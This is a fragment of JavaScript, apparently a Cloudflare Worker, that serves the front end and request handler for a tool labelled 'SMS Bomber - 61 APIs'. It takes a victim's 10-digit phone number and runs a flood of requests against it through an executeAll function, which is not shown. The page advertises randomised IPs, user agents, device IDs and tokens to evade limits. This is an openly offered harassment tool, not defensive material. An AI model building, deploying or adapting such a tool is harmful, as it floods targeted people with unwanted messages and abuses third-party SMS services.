    async fetch(request, env, ctx) {
        const url = new URL(request.url);
        const mobile = url.searchParams.get('mobile');

        const corsHeaders = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type'
        };

        if (request.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

        if (!mobile) {
            return new Response(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>SMS Bomber - 61 APIs</title>
                    <style>
                        body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; background: #0a0a0a; color: #fff; }
                        input[type="text"] { padding: 10px; width: 250px; border: 2px solid #00ff41; border-radius: 5px; font-size: 16px; background: #0a0a0a; color: #00ff41; }
                        button { padding: 10px 30px; background: #00ff41; color: #0a0a0a; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }
                        button:hover { background: #00cc33; }
                        h1 { color: #00ff41; }
                        .info { background: #00ff4122; padding: 15px; border-radius: 5px; margin: 20px 0; border: 1px solid #00ff41; }
                    </style>
                </head>
                <body>
                    <h1>⚡ SMS Bomber - 61 APIs ⚡</h1>
                    <div class="info">
                        <strong>Total APIs:</strong> ${APIS.length}<br>
                        <strong>Features:</strong> Random IP, User-Agent, Device ID, JWT tokens, etc.
                    </div>
                    <form method="get" action="">
                        <label for="mobile">Enter Mobile Number (10 digits):</label><br><br>
                        <input type="text" id="mobile" name="mobile" placeholder="9876543210" required pattern="^\\d{10}$">
                        <button type="submit">🚀 START</button>
                    </form>
                </body>
                </html>
            `, { headers: { 'Content-Type': 'text/html', ...corsHeaders } });
        }

        const cleanMobile = mobile.replace(/[^0-9]/g, '');
        if (cleanMobile.length !== 10) {
            return new Response(JSON.stringify({ error: 'Please enter a valid 10-digit mobile number' }), {
                status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders }
            });
        }

        try {
            const data = await executeAll(cleanMobile);
            return new Response(JSON.stringify({
                success: true,
                message: `SMS Bombing completed on ${cleanMobile}`,
                total_apis: data.results.length,
                success_count: data.successful,
                failed_count: data.failed,
                total_time: data.totalTime + 's',
                results: data.results
            }, null, 2), {
                headers: { 'Content-Type': 'application/json', ...corsHeaders }
            });
        } catch (err) {
            return new Response(JSON.stringify({ success: false, error: err.message }), {
                status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders }
            });
        }
    }
};
